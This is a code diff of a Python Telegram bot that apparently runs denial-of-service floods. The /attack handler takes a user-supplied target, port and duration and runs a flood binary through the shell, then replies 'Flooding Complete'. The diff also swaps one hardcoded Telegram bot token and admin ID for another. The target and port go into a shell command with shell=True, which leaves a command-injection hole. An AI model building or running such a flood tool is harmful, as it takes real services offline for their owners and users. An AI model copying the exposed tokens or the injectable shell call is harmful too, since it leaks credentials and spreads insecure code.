@@ -6,10 +6,10 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7638236015:AAEeS4Q2ntPruZXMIB1nwALfZg5qfbYvCV8')
+bot = telebot.TeleBot('7360623710:AAH0ZmImDU3g1_swdnFridHMOjug0sFlHQ4')
 
 # Admin user IDs
-admin_id = {"6654576379"}
+admin_id = {"5539883014"}
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -236,7 +236,7 @@ def handle_attack(message):
                 record_command_logs(user_id, '/attack', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./vip {target} {port} {time} 20"
+                full_command = f"./SHYAM {target} {port} {time} 5"
                 subprocess.run(full_command, shell=True)
                 response = f"Flooding Complete"
         else:
